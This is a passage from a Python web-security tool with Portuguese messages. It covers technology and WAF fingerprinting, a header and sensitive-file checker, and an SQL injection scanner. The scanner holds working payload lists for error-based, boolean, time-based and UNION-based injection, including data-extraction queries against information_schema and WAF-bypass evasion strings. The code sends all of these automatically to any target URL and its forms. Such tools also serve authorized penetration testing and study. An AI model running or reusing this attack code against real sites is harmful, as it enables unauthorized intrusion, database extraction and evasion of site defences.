            "MySQL": r"you have an error in your sql syntax|warning: mysql", "PostgreSQL": r"postgres[ql]? error",
            "Microsoft SQL Server": r"unclosed quotation mark|incorrect syntax near", "Oracle": r"ora-[0-9][0-9][0-9][0-9]",
        }
        test_url_param = next((urljoin(final_url, a['href']) for a in soup.find_all('a', href=True) if '?' in a['href'] and '=' in a['href']), None)
        if test_url_param:
            parsed = urlparse(test_url_param)
            params = parse_qs(parsed.query)
            first_param = list(params.keys())[0]
            params[first_param] = params[first_param][0] + "'"
            try:
                error_res = requests.get(urlunparse(parsed._replace(query=urlencode(params, doseq=True))), timeout=3, verify=False)
                for db, pattern in error_patterns.items():
                    if re.search(pattern, error_res.text, re.IGNORECASE):
                        findings["Base de Dados"].add(db)
                        break
            except requests.RequestException: pass

        if return_findings: return findings

        table = Table(title=f"Tecnologias Detectadas em {final_url}")
        table.add_column("Categoria", style="cyan")
        table.add_column("Tecnologia(s) Identificada(s)", style="magenta")
        has_findings = any(findings.values())
        if has_findings:
            for category, tech_set in findings.items():
                if tech_set:
                    table.add_row(category, ", ".join(sorted(list(tech_set))))
            console.print(table)
        else:
            console.print("[bold yellow][-] Nenhuma tecnologia específica foi detectada com confiança.[/bold yellow]")

    except requests.RequestException as e:
        if not return_findings: console.print(f"[bold red][!] Erro ao obter a URL: {e}[/bold red]")
    finally:
        if not return_findings: console.print("-" * 60)
    
    return findings if return_findings else None

# --- MÓDULO 12: DETECÇÃO DE WAF ---

def detect_waf(url):
    """Tenta detectar a presença de um Web Application Firewall (WAF)."""
    console.print("-" * 60)
    console.print(f"[*] Verificando a presença de WAF em: [bold cyan]{url}[/bold cyan]")
    console.print("-" * 60)

    malicious_payload = "?id=<script>alert('XSS')</script>"
    test_url = urljoin(url, malicious_payload)
    waf_signatures = {
        "Cloudflare": {"server": "cloudflare"}, "Sucuri": {"server": "Sucuri/Cloudproxy"},
        "Akamai": {"server": "AkamaiGHost"}, "Incapsula": {"cookie": "incap_ses_"},
        "Wordfence": {"body": "blocked by Wordfence"},
    }

    try:
        with console.status("[bold green]Enviando requisições para detectar WAF...[/bold green]"):
            normal_response = requests.get(url, timeout=5, headers={'User-Agent': 'Mozilla/5.0'}, verify=False)
            waf_response = requests.get(test_url, timeout=5, headers={'User-Agent': 'Mozilla/5.0'}, verify=False)

        # 1. Verifica por cabeçalhos de servidor
        for waf, sig in waf_signatures.items():
            if "server" in sig and sig["server"].lower() in waf_response.headers.get("Server", "").lower():
                console.print(f"[bold green][+] WAF Detectado:[/bold green] [yellow]{waf}[/yellow] (pelo cabeçalho 'Server')")
                return

        # 2. Verifica por cookies
        for waf, sig in waf_signatures.items():
            if "cookie" in sig and sig["cookie"] in waf_response.cookies:
                console.print(f"[bold green][+] WAF Detectado:[/bold green] [yellow]{waf}[/yellow] (por cookie)")
                return

        # 3. Verifica por conteúdo na página
        for waf, sig in waf_signatures.items():
            if "body" in sig and sig["body"].lower() in waf_response.text.lower():
                console.print(f"[bold green][+] WAF Detectado:[/bold green] [yellow]{waf}[/yellow] (pelo conteúdo da página)")
                return

        # 4. Verifica por status code de bloqueio
        if waf_response.status_code in [403, 406, 429] and normal_response.status_code == 200:
            console.print(f"[bold green][+] WAF Detectado:[/bold green] [yellow]WAF Genérico[/yellow] (Status Code: {waf_response.status_code})")
            return

        console.print("[bold yellow][-] Nenhum WAF conhecido foi detectado com esta técnica.[/bold yellow]")

    except requests.RequestException as e:
        console.print(f"[bold red][!] Erro ao tentar detectar WAF: {e}[/bold red]")
    console.print("-" * 60)

# --- MÓDULO 13: VERIFICADOR DE VULNERABILIDADES BÁSICAS (MELHORADO) ---

class VulnerabilityScanner:
    """Classe para organizar a verificação de vulnerabilidades."""
    
    def __init__(self, url):
        self.url = url if url.startswith('http') else f'http://{url}'
        self.findings = []
        self.response = None
        self.detected_techs = []

    def _get_initial_response(self):
        try:
            self.response = requests.get(self.url, timeout=10, headers={'User-Agent': 'Mozilla/5.0'}, allow_redirects=True, verify=False)
            self.url = self.response.url
            return True
        except requests.RequestException as e:
            console.print(f"[bold red][!] Não foi possível obter a página inicial: {e}[/bold red]")
            return False

    def _add_finding(self, risk, v_type, detail, recommendation):
        self.findings.append({"Risco": risk, "Tipo": v_type, "Detalhe": detail, "Recomendação": recommendation})

    def _check_security_headers(self):
        headers = self.response.headers
        security_headers_map = {
            "Content-Security-Policy": ("Médio", "Implementar CSP para prevenir ataques de XSS e injeção de dados."),
            "X-Frame-Options": ("Médio", "Usar 'X-Frame-Options: DENY' ou 'SAMEORIGIN' para prevenir Clickjacking."),
            "Strict-Transport-Security": ("Médio", "Implementar HSTS para forçar conexões HTTPS."),
            "Referrer-Policy": ("Baixo", "Definir 'Referrer-Policy: strict-origin-when-cross-origin' ou mais restritiva."),
            "Permissions-Policy": ("Baixo", "Definir uma política de permissões para limitar o acesso a APIs do navegador.")
        }
        for header, (risk, rec) in security_headers_map.items():
            if header not in headers:
                self._add_finding(risk, "Má Configuração de Segurança", f"Cabeçalho '{header}' ausente.", rec)

    def _check_insecure_cookies(self):
        for cookie in self.response.cookies:
            if not cookie.secure and urlparse(self.url).scheme == 'https':
                self._add_finding("Baixo", "Cookie Inseguro", f"O cookie '{cookie.name}' não possui a flag 'Secure'.", "Adicionar a flag 'Secure' a todos os cookies em sites HTTPS.")
            if not getattr(cookie, 'has_nonstandard_attr', lambda x: False)('httponly') and not getattr(cookie, '_rest', {}).get('httponly', False) and cookie.name.lower() not in ['_ga']:
                self._add_finding("Baixo", "Cookie Inseguro", f"O cookie '{cookie.name}' não possui a flag 'HttpOnly'.", "Adicionar a flag 'HttpOnly' para prevenir acesso via JavaScript.")
    
    def _check_info_disclosure(self):
        server_version = self.response.headers.get('Server', '')
        if server_version:
            self._add_finding("Baixo", "Exposição de Informação", f"O servidor expõe sua versão: {server_version}", "Ocultar ou alterar o banner do servidor para evitar a enumeração de versões.")
        
        emails = set(re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', self.response.text))
        if emails:
            self._add_finding("Baixo", "Exposição de Informação", f"E-mails encontrados: {', '.join(emails)}", "Remover ou ofuscar endereços de e-mail de páginas públicas.")

    def _analyze_robots_txt(self):
        robots_url = urljoin(self.url, '/robots.txt')
        try:
            res = requests.get(robots_url, timeout=5, verify=False)
            if res.ok:
                disallowed_paths = re.findall(r'Disallow:\s*(.*)', res.text)
                if disallowed_paths:
                    paths = "\n".join([p.strip() for p in disallowed_paths])
                    self._add_finding("Baixo", "Exposição de Informação", f"Caminhos sensíveis encontrados no robots.txt:\n{paths}", "Verificar se os caminhos 'Disallow' não são acessíveis publicamente.")
        except requests.RequestException: pass

    def _check_sensitive_files(self):
        sensitive_files = {
            ".env": "Contém credenciais de ambiente, chaves de API.", ".git/config": "Expõe o URL do repositório de código-fonte.",
            "docker-compose.yml": "Revela a infraestrutura e configuração de serviços.", "database.yml": "Ficheiro de configuração de base de dados (comum em Rails).",
            "wp-config.php.bak": "Backup de configuração do WordPress com credenciais de BD.", "local.xml": "Configuração do Magento com credenciais de BD.",
            "backup.sql": "Backup de base de dados, pode conter dados sensíveis.",
        }
        found_files = discover_directories(self.url, list(sensitive_files.keys()), workers=20, internal_call=True)
        for file_url, status, _ in found_files:
            if status == 200:
                filename = file_url.split('/')[-1]
                reason = sensitive_files.get(filename, "Ficheiro de configuração ou backup.")
                self._add_finding("Alto", "Exposição de Ficheiro Sensível", f"Ficheiro encontrado: {file_url}", f"Remover o ficheiro imediatamente do acesso público. {reason}")

    def _run_tech_specific_checks(self):
        if any('wordpress' in t.lower() for t in self.detected_techs):
            xmlrpc_url = urljoin(self.url, 'xmlrpc.php')
            try:
                res = requests.get(xmlrpc_url, timeout=5, verify=False)
                if res.status_code == 200 or res.status_code == 405:
                     self._add_finding("Médio", "Má Configuração (WordPress)", "O ficheiro xmlrpc.php está ativo.", "Desativar o xmlrpc.php se não for usado para prevenir ataques de força bruta e DDoS.")
            except requests.RequestException: pass

    def run_scan(self, return_findings=False):
        if not return_findings:
            console.print("-" * 60)
            console.print(f"[*] Executando verificação de vulnerabilidades em: [bold cyan]{self.url}[/bold cyan]")
            console.print("-" * 60)
        
        with console.status("[bold green]Analisando configurações de segurança...[/bold green]", spinner="dots"):
            if not self._get_initial_response():
                return [] if return_findings else None

            tech_findings = detect_technologies(self.url, return_findings=True)
            if tech_findings:
                self.detected_techs = [tech for sublist in tech_findings.values() for tech in sublist]
            
            self._check_security_headers()
            self._check_insecure_cookies()
            self._check_info_disclosure()
            self._analyze_robots_txt()
            self._check_sensitive_files()
            if self.detected_techs:
                self._run_tech_specific_checks()
        
        if return_findings: return self.findings
        self._present_findings()

    def _present_findings(self):
        console.print("-" * 60)
        if not self.findings:
            console.print("[bold green][+] Nenhuma vulnerabilidade de baixo risco foi encontrada.[/bold green]")
        else:
            table = Table(title=f"Relatório de Vulnerabilidades Encontradas em {self.url}")
            table.add_column("Risco", justify="center")
            table.add_column("Tipo de Vulnerabilidade", style="cyan")
            table.add_column("Detalhe", style="magenta")
            table.add_column("Recomendação", style="white")

            risk_order = {"Alto": 0, "Médio": 1, "Baixo": 2}
            sorted_findings = sorted(self.findings, key=lambda x: risk_order[x["Risco"]])
            risk_counts = Counter(f['Risco'] for f in sorted_findings)

            for f in sorted_findings:
                risk_style = "red" if f['Risco'] == 'Alto' else "yellow" if f['Risco'] == 'Médio' else "green"
                table.add_row(f"[{risk_style}]{f['Risco']}[/{risk_style}]", f['Tipo'], f['Detalhe'], f['Recomendação'])
            
            console.print(table)
            
            summary_parts = []
            if risk_counts['Alto'] > 0: summary_parts.append(f"[red]{risk_counts['Alto']} Risco(s) Alto(s)[/red]")
            if risk_counts['Médio'] > 0: summary_parts.append(f"[yellow]{risk_counts['Médio']} Risco(s) Médio(s)[/yellow]")
            if risk_counts['Baixo'] > 0: summary_parts.append(f"[green]{risk_counts['Baixo']} Risco(s) Baixo(s)[/green]")
            
            console.print(f"\n[bold]Resumo dos Riscos:[/bold] {', '.join(summary_parts)} encontrados.")
        console.print("-" * 60)

def vuln_scan(url):
    VulnerabilityScanner(url).run_scan()

# --- MÓDULO 14: SCANNER DE SQL INJECTION MELHORADO ---

class SQLiScanner:
    """Classe para realizar scans de SQL Injection com múltiplos níveis e técnicas."""

    def __init__(self, base_url, level=1, dbms=None):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
        self.vulnerable_points = []
        self.level = level
        self.dbms = dbms.lower() if dbms else None
        self.waf_detected = None
        self.db_fingerprint = None
        self.confirmed_vulns = []
        self.statistics = {
            'total_tests': 0,
            'vulnerabilities_found': 0,
            'false_positives_filtered': 0,
            'waf_bypasses': 0,
            'confirmed_vulns': 0
        }
        
        # Assinaturas de WAF/IPS
        self.waf_signatures = {
            'cloudflare': {
                'headers': [r'cf-ray', r'cloudflare', r'__cfduid'],
                'content': [r'cloudflare', r'attention required', r'checking your browser'],
                'status_codes': [403, 503]
            },
            'akamai': {
                'headers': [r'akamai', r'ghost'],
                'content': [r'reference.*18\\..*\\.\\d+\\.\\d+'],
                'status_codes': [403]
            },
            'aws_waf': {
                'headers': [r'awselb', r'x-amzn'],
                'content': [r'aws', r'request blocked'],
                'status_codes': [403]
            },
            'mod_security': {
                'headers': [r'mod_security', r'modsecurity'],
                'content': [r'mod_security', r'not acceptable', r'reference id'],
                'status_codes': [403, 406]
            },
            'imperva': {
                'headers': [r'x-iinfo'],
                'content': [r'imperva', r'incapsula'],
                'status_codes': [403]
            }
        }
        
        # Payloads estruturados por tipo para serem ativados por nível
        self.payloads = {
            "error_based": {
                "basic": ["'", "\"", "')", ";'", ";", "' AND 'x'='y"],
                "intermediate": ["' /*comment*/ AND /*comment*/ 'x'='y", "'%20AND%20'x'='y", "' %0aAND%0a 'x'='y"],
                "advanced": ["' /*!50000AND*/ 'x'='y", "'+%0d%0a+AND+%0d%0a+'x'='y", "'/**/AND/**/'x'='y"]
            },
            "boolean_based": {
                "true": {
                    "basic": ["' OR '1'='1", " OR 1=1", "' OR 1=1--", " OR 1=1--", "' OR 1=1#", " OR 1=1#"],
                    "evasive": ["' /*comment*/ OR /*comment*/ '1'='1", "' %0aOR%0a '1'='1", "'+OR+ASCII(SUBSTR((SELECT+database()),1,1))>0--"],
                    "advanced": ["' /*!50000OR*/ '1'='1", "'||'1'='1", "' OR 'x'='x' AND 'y'='y"]
                },
                "false": {
                    "basic": ["' AND '1'='2", " AND 1=2", "' AND 1=2--", " AND 1=2--", "' AND 1=2#", " AND 1=2#"],
                    "evasive": ["' /*comment*/ AND /*comment*/ '1'='2", "' %0aAND%0a '1'='2", "'+AND+ASCII(SUBSTR((SELECT+database()),1,1))>200--"],
                    "advanced": ["' /*!50000AND*/ '1'='2", "'&&'1'='2", "' AND 'x'='y' AND 'z'='w"]
                }
            },
            "time_based": {
                "mysql": {
                    "basic": "' AND SLEEP(5)--",
                    "evasive": "' /*comment*/ AND /*comment*/ SLEEP(5)--",
                    "advanced": "' /*!50000AND*/ SLEEP(5)--"
                },
                "postgresql": {
                    "basic": "' AND pg_sleep(5)--",
                    "evasive": "' /*comment*/ AND /*comment*/ pg_sleep(5)--",
                    "advanced": "' AND (SELECT pg_sleep(5))--"
                },
                "mssql": {
                    "basic": "' WAITFOR DELAY '0:0:5'--",
                    "evasive": "' /*comment*/ WAITFOR /*comment*/ DELAY '0:0:5'--",
                    "advanced": ";WAITFOR DELAY '0:0:5'--"
                },
                "oracle": {
                    "basic": "' AND DBMS_LOCK.SLEEP(5)--",
                    "evasive": "' /*comment*/ AND /*comment*/ DBMS_LOCK.SLEEP(5)--",
                    "advanced": "' AND (SELECT DBMS_LOCK.SLEEP(5) FROM DUAL)--"
                },
                "sqlite": {
                    "basic": "' AND LIKE('ABC',UPPER(HEX(RANDOMBLOB(1000000000/2))))--",
                    "evasive": "' /*comment*/ AND /*comment*/ LIKE('ABC',UPPER(HEX(RANDOMBLOB(1000000000/2))))--",
                    "advanced": "' AND (SELECT LIKE('ABC',UPPER(HEX(RANDOMBLOB(1000000000/2)))))--"
                }
            },
            "union_based": {
                "detection": ["' UNION SELECT NULL--", "' UNION ALL SELECT NULL--", "'+UNION+SELECT+NULL--"],
                "column_enum": [
                    "' UNION SELECT NULL,NULL--",
                    "' UNION SELECT NULL,NULL,NULL--",
                    "' UNION SELECT NULL,NULL,NULL,NULL--",
                    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--"
                ],
                "data_extraction": [
                    "' UNION SELECT database(),user()--",
                    "' UNION SELECT version(),@@version_comment--",
                    "' UNION SELECT table_name,column_name FROM information_schema.columns--"
                ]
            }
        }
        self.error_patterns = {
            "mysql": r"you have an error in your sql syntax|warning: mysql|unknown column|illegal mix of collations",
            "postgresql": r"postgres[ql]? error|unterminated quoted string|syntax error at or near",
            "mssql": r"unclosed quotation mark|incorrect syntax near|conversion failed when converting",
            "oracle": r"ora-[0-9][0-9][0-9][0-9]|quoted string not properly terminated",
            "sqlite": r"sqlite error|near \".*?\": syntax error"
        }

    def _get_page_content(self, url, method='get', data=None, timeout=7):
        """Obtém o conteúdo de uma página e o tempo de resposta."""
        try:
            start_time = time.time()
            if method.lower() == 'get': response = self.session.get(url, params=data, timeout=timeout, verify=False)
            else: response = self.session.post(url, data=data, timeout=timeout, verify=False)
            duration = time.time() - start_time
            return response.text, duration
        except requests.exceptions.RequestException: return None, 0

    def _add_finding(self, risk, v_type, detail, recommendation):
        """Adiciona uma nova descoberta, evitando duplicados."""
        console.print(f"[bold red][VULNERABLE][/bold red] {v_type} detectada. Detalhes: {detail}")
        finding = {"Risco": risk, "Tipo": v_type, "Detalhe": detail, "Recomendação": recommendation}
        if finding not in self.vulnerable_points: 
            self.vulnerable_points.append(finding)
            self.statistics['vulnerabilities_found'] += 1
    
    def _detect_waf(self, response):
        """Detecta presença de WAF baseado em headers, conteúdo e status codes."""
        if not response:
            return None
            
        response_headers = ' '.join([f'{k}: {v}' for k, v in response.headers.items()]).lower()
        response_content = response.text.lower()
        status_code = response.status_code
        
        for waf_name, signatures in self.waf_signatures.items():
            # Verifica headers
            for header_pattern in signatures['headers']:
                if re.search(header_pattern, response_headers, re.IGNORECASE):
                    return waf_name
            
            # Verifica conteúdo
            for content_pattern in signatures['content']:
                if re.search(content_pattern, response_content, re.IGNORECASE):
                    return waf_name
            
            # Verifica status codes
            if status_code in signatures['status_codes']:
                # Confirma com padrões de conteúdo se disponível
                if signatures['content'] and any(re.search(pattern, response_content, re.IGNORECASE) 
                                               for pattern in signatures['content']):
                    return waf_name
        
        return None
    
    def _test_waf_bypass(self, url, param, original_value, method, form_data=None):
        """Testa técnicas de bypass de WAF."""
        bypass_techniques = [
            "' /*comment*/ OR /*comment*/ '1'='1",
            "' /*!50000OR*/ '1'='1",
            "' %0aOR%0a '1'='1",
            "'+OR+ASCII(SUBSTR((SELECT+database()),1,1))>0--",
            "'/**/OR/**/'1'='1",
            "' OR 'x'='x' AND 'y'='y"
        ]
        
        for technique in bypass_techniques:
            test_value = (original_value or "") + technique
            data = {param: test_value} if method == 'get' else {**(form_data or {}), param: test_value}
            
            try:
                if method.lower() == 'get':
                    response = self.session.get(url, params=data, timeout=7, verify=False)
                else:
                    response = self.session.post(url, data=data, timeout=7, verify=False)
                
                # Se não há bloqueio (status 200), é um possível bypass
                if response.status_code == 200:
                    waf = self._detect_waf(response)
                    if not waf:  # WAF não detectado = possível bypass
                        self.statistics['waf_bypasses'] += 1
                        return technique, response
                        
            except requests.exceptions.RequestException:
                continue
        
        return None, None
    
    def _confirm_vulnerability(self, url, param, original_value, method, form_data, payload_type, payload):
        """Confirma vulnerabilidade com múltiplos testes."""
        confirmations = 0
        tests = 3
        
        for i in range(tests):
            test_value = (original_value or "") + payload
            data = {param: test_value} if method == 'get' else {**(form_data or {}), param: test_value}
            content, duration = self._get_page_content(url, method=method, data=data)
            
            if content:
                if payload_type == "error_based":
                    for db, pattern in self.error_patterns.items():
                        if re.search(pattern, content, re.IGNORECASE):
                            confirmations += 1
                            break
                elif payload_type == "time_based":
                    if duration > 4.5:
                        confirmations += 1
                # Adicionar outras confirmações conforme necessário
        
        # Considera confirmado se 2 de 3 testes passarem
        if confirmations >= 2:
            self.statistics['confirmed_vulns'] += 1
            return True
        else:
            self.statistics['false_positives_filtered'] += 1
            return False
    
    def _fingerprint_database(self, url, param, original_value, method, form_data=None):
        """Tenta identificar o tipo de banco de dados."""
        fingerprint_tests = {
            'mysql': "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            'postgresql': "' AND (SELECT COUNT(*) FROM pg_tables)>0--", 
            'mssql': "' AND (SELECT COUNT(*) FROM sys.tables)>0--",
            'oracle': "' AND (SELECT COUNT(*) FROM all_tables)>0--",
            'sqlite': "' AND (SELECT COUNT(*) FROM sqlite_master)>0--"
        }
        
        for db_type, test_payload in fingerprint_tests.items():
            test_value = (original_value or "") + test_payload
            data = {param: test_value} if method == 'get' else {**(form_data or {}), param: test_value}
            content, _ = self._get_page_content(url, method=method, data=data)
            
            if content and not any(re.search(pattern, content, re.IGNORECASE) 
                                 for pattern in self.error_patterns.values()):
                return db_type
        
        return None
    
    def _test_union_based(self, url, param, original_value, method, form_data=None):
        """Testa injeção UNION-based SQL."""
        console.print(f"  [cyan][INFO][/cyan] Testando UNION-based no parâmetro [bold]{param}[/bold]")
        # Primeiro, detecta o número de colunas
        columns_detected = 0
        
        for col_count in range(1, 10):  # Testa até 10 colunas
            payload = f"' UNION SELECT {','.join(['NULL'] * col_count)}--"
            console.print(f"    [grey50]Tentando com {col_count} colunas...[/grey50]")
            test_value = (original_value or "") + payload
            data = {param: test_value} if method == 'get' else {**(form_data or {}), param: test_value}
            content, _ = self._get_page_content(url, method=method, data=data)
            
            if content:
                # Se não há erro, provavelmente encontrou o número correto de colunas
                error_found = False
                for pattern in self.error_patterns.values():
                    if re.search(pattern, content, re.IGNORECASE):
                        error_found = True
                        break
                
                if not error_found:
                    console.print(f"  [green][SUCCESS][/green] Detectado {col_count} colunas.")
                    columns_detected = col_count
                    break
        
        if columns_detected > 0:
            # Tenta extrair informações usando UNION
            extraction_payloads = [
                f"' UNION SELECT {','.join(['NULL'] * (columns_detected-2) + ['database()', 'user()'])}--",
                f"' UNION SELECT {','.join(['NULL'] * (columns_detected-2) + ['version()', '@@version_comment'])}--",
                f"' UNION SELECT {','.join(['NULL'] * (columns_detected-1) + ['table_name'])} FROM information_schema.tables--"
            ]
            
            for payload in extraction_payloads:
                console.print(f"    [grey50]Tentando extrair dados com: {payload[:70]}[/grey50]")
                test_value = (original_value or "") + payload
                data = {param: test_value} if method == 'get' else {**(form_data or {}), param: test_value}
                content, _ = self._get_page_content(url, method=method, data=data)
                
                if content and 'null' not in content.lower():
                    # Confirma a vulnerabilidade
                    if self._confirm_vulnerability(url, param, original_value, method, form_data, "union_based", payload):
                        self._add_finding("Alto", "SQL Injection", 
                                        f"Parâmetro '{param}' em {url} ({method.upper()})", 
                                        f"Técnica: UNION-Based. Colunas detectadas: {columns_detected}. Payload: '{payload}'")
                        return True
        
        return False

    def _test_param(self, url, param, original_value, method, form_data=None):
        """Testa um único parâmetro com base no nível de scan definido."""
        self.statistics['total_tests'] += 1
        console.print(f"[cyan][INFO][/cyan] Testando o parâmetro [bold]{param}[/bold] em {url}")
        
        # Detecção inicial de WAF com payload simples
        test_response = None
        try:
            if method.lower() == 'get':
                test_response = self.session.get(url, params={param: original_value + "'"}, timeout=7, verify=False)
            else:
                test_response = self.session.post(url, data={**(form_data or {}), param: original_value + "'"}, timeout=7, verify=False)
            
            if test_response:
                detected_waf = self._detect_waf(test_response)
                if detected_waf and not self.waf_detected:
                    self.waf_detected = detected_waf
                    console.print(f"[bold yellow]⚠️  WAF Detectado: {detected_waf.upper()}[/bold yellow]")
        except:
            pass
        
        # Tenta fingerprinting do banco se não foi especificado
        if not self.db_fingerprint and not self.dbms:
            self.db_fingerprint = self._fingerprint_database(url, param, original_value, method, form_data)
            if self.db_fingerprint:
                console.print(f"[bold cyan]🔍 Banco identificado: {self.db_fingerprint.upper()}[/bold cyan]")
        
        # Nível 1: Error-based
        if self.level >= 1:
            if self._test_error_based(url, param, original_value, method, form_data): 
                return
        
        # Nível 2: Boolean-based e UNION-based
        if self.level >= 2:
            if self._test_boolean_based(url, param, original_value, method, form_data): 
                return
            if self._test_union_based(url, param, original_value, method, form_data):
                return
        
        # Nível 3: Time-based
        if self.level >= 3:
            if self._test_time_based(url, param, original_value, method, form_data): 
                return
        
        # Se WAF foi detectado, tenta bypass
        if self.waf_detected and self.level >= 2:
            bypass_payload, bypass_response = self._test_waf_bypass(url, param, original_value, method, form_data)
            if bypass_payload:
                console.print(f"[bold green]✅ WAF Bypass encontrado: {bypass_payload[:50]}...[/bold green]")
                # Re-testa com payloads evasivos após bypass
                self._test_error_based(url, param, original_value, method, form_data, use_evasive=True)

    def _test_error_based(self, url, param, original_value, method, form_data=None, use_evasive=False):
        """Testa a injeção baseada em erros com payloads básicos e evasivos."""
        payload_sets = ['basic']
        if use_evasive or self.waf_detected:
            payload_sets.extend(['intermediate', 'advanced'])
        
        console.print(f"  [cyan][INFO][/cyan] Testando Error-Based (Nível 1)...")
        for payload_type in payload_sets:
            for payload in self.payloads["error_based"][payload_type]:
                console.print(f"    [grey50]Payload: {payload}[/grey50]")
                test_value = (original_value or "") + payload
                data = {param: test_value} if method == 'get' else {**(form_data or {}), param: test_value}
                content, _ = self._get_page_content(url, method=method, data=data)
                
                if content:
                    db_patterns = {self.dbms: self.error_patterns[self.dbms]} if self.dbms and self.dbms in self.error_patterns else self.error_patterns
                    for db, pattern in db_patterns.items():
                        if re.search(pattern, content, re.IGNORECASE):
                            if self._confirm_vulnerability(url, param, original_value, method, form_data, "error_based", payload):
                                evasion_info = f" (Evasivo: {payload_type})" if payload_type != 'basic' else ""
                                self._add_finding("Alto", "SQL Injection", 
                                                f"Parâmetro '{param}' em {url} ({method.upper()})", 
                                                f"Técnica: Error-Based{evasion_info}. Payload: '{payload}'. BD Provável: {db.capitalize()}")
                                return True
        return False

    def _test_boolean_based(self, url, param, original_value, method, form_data=None):
        """Testa a injeção booleana cega."""
        console.print(f"  [cyan][INFO][/cyan] Testando Boolean-Based (Nível 2)...")
        original_data = {param: original_value} if method == 'get' else form_data
        original_content, _ = self._get_page_content(url, method=method, data=original_data)
        if not original_content: return False
        
        payload_sets = ['basic']
        if self.waf_detected:
            payload_sets.extend(['evasive', 'advanced'])
        
        for payload_type in payload_sets:
            for payload in self.payloads["boolean_based"]["true"][payload_type]:
                console.print(f"    [grey50]Payload (True): {payload}[/grey50]")
                test_value = (original_value or "") + payload
                true_data = {param: test_value} if method == 'get' else {**(form_data or {}), param: test_value}
                true_content, _ = self._get_page_content(url, method=method, data=true_data)
            
                if true_content and SequenceMatcher(None, original_content, true_content).ratio() > 0.95:
                    for false_payload in self.payloads["boolean_based"]["false"][payload_type]:
                        console.print(f"    [grey50]Payload (False): {false_payload}[/grey50]")
                        false_test_value = (original_value or "") + false_payload
                        false_data = {param: false_test_value} if method == 'get' else {**(form_data or {}), param: false_test_value}
                        false_content, _ = self._get_page_content(url, method=method, data=false_data)
                        
                        if false_content and SequenceMatcher(None, original_content, false_content).ratio() < 0.9:
                            if self._confirm_vulnerability(url, param, original_value, method, form_data, "boolean_based", payload):
                                evasion_info = f" (Evasivo: {payload_type})" if payload_type != 'basic' else ""
                                self._add_finding("Alto", "SQL Injection", 
                                                f"Parâmetro '{param}' em {url} ({method.upper()})", 
                                                f"Técnica: Boolean-Based{evasion_info}. Payload: '{payload}'")
                                return True
        return False

    def _test_time_based(self, url, param, original_value, method, form_data=None):
        """Testa a injeção cega baseada em tempo com payloads evasivos."""
        console.print(f"  [cyan][INFO][/cyan] Testando Time-Based (Nível 3)...")
        databases_to_test = {}
        if self.dbms and self.dbms in self.payloads["time_based"]:
            databases_to_test[self.dbms] = self.payloads["time_based"][self.dbms]
        elif self.db_fingerprint and self.db_fingerprint in self.payloads["time_based"]:
            databases_to_test[self.db_fingerprint] = self.payloads["time_based"][self.db_fingerprint]
        else:
            databases_to_test = self.payloads["time_based"]

        payload_types = ['basic']
        if self.waf_detected:
            payload_types.extend(['evasive', 'advanced'])

        for db, payload_dict in databases_to_test.items():
            console.print(f"  [cyan][INFO][/cyan] Testando payloads para [bold]{db}[/bold]...")
            for payload_type in payload_types:
                if payload_type in payload_dict:
                    payload_template = payload_dict[payload_type]
                    console.print(f"    [grey50]Payload: {payload_template}[/grey50]")
                    test_value = (original_value or "") + payload_template
                    data = {param: test_value} if method == 'get' else {**(form_data or {}), param: test_value}
                    _, duration = self._get_page_content(url, method=method, data=data, timeout=10)
                    
                    if duration > 4.5:
                        if self._confirm_vulnerability(url, param, original_value, method, form_data, "time_based", payload_template):
                            evasion_info = f" (Evasivo: {payload_type})" if payload_type != 'basic' else ""
                            self._add_finding("Alto", "SQL Injection", 
                                            f"Parâmetro '{param}' em {url} ({method.upper()})", 
                                            f"Técnica: Time-Based Blind{evasion_info}. Payload: '{payload_template}'. BD Provável: {db.capitalize()}")
                            return True
        return False

    def run_scan(self, return_findings=False):
        """Executa o scan de SQLi, descobrindo pontos de entrada e testando-os."""
        if not return_findings:
            console.print("\n[bold cyan]═══ SCANNER SQL INJECTION AVANÇADO ═══[/bold cyan]")
            
            # Tabela de configuração
            config_table = Table(title="Configuração do Scan", show_header=True, header_style="bold magenta")
            config_table.add_column("Parâmetro", style="cyan", width=15)
            config_table.add_column("Valor", style="yellow", width=30)
            config_table.add_column("Descrição", style="white", width=25)
            
            config_table.add_row("URL Alvo", self.base_url, "Site para análise")
            config_table.add_row("Nível", str(self.level), f"1=Error, 2=Boolean+Union, 3=Time")
            
            if self.dbms:
                config_table.add_row("DBMS Alvo", self.dbms.upper(), "Banco específico")
            else:
                config_table.add_row("DBMS Alvo", "Auto-detect", "Detecção automática")
            
            techniques = []
            if self.level >= 1: techniques.append("Error-based")
            if self.level >= 2: techniques.extend(["Boolean-based", "UNION-based"])
            if self.level >= 3: techniques.append("Time-based")
            
            config_table.add_row("Técnicas", ", ".join(techniques), "Métodos de teste")
            config_table.add_row("WAF Bypass", "Ativado", "Payloads evasivos")
            config_table.add_row("Confirmação", "3 tentativas", "Anti-falso positivo")
            
            console.print(config_table)
            console.print()
        try:
            with console.status("[bold green]Coletando pontos de entrada (links e formulários)...[/bold green]"):
                response = self.session.get(self.base_url, timeout=10, verify=False)
                soup = BeautifulSoup(response.content, 'html.parser')
        except requests.RequestException as e:
            if not return_findings: console.print(f"[bold red][!] Não foi possível aceder à página inicial: {e}[/bold red]")
            return [] if return_findings else None

        tasks = []
        links = {urljoin(self.base_url, a['href']) for a in soup.find_all('a', href=True) if '?' in a['href'] and '=' in a['href']}
        for link in links:
            parsed = urlparse(link)
            base = urlunparse(parsed._replace(query=""))
            for param, values in parse_qs(parsed.query).items():
                tasks.append(('get', base, param, values[0], None))
        
        forms = soup.find_all('form')
        for form in forms:
            action = urljoin(self.base_url, form.get('action', ''))
            method = form.get('method', 'post').lower()
            form_data = {i.get('name'): i.get('value', 'test') for i in form.find_all(['input', 'textarea']) if i.get('name')}
            for param in form_data:
                tasks.append((method, action, param, form_data[param], form_data))

        if not tasks:
            if not return_findings: console.print("[yellow]Nenhum ponto de entrada (parâmetro ou formulário) encontrado para testar.[/yellow]")
            return [] if return_findings else None
        
        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"), TimeRemainingColumn(), console=console, transient=return_findings) as progress:
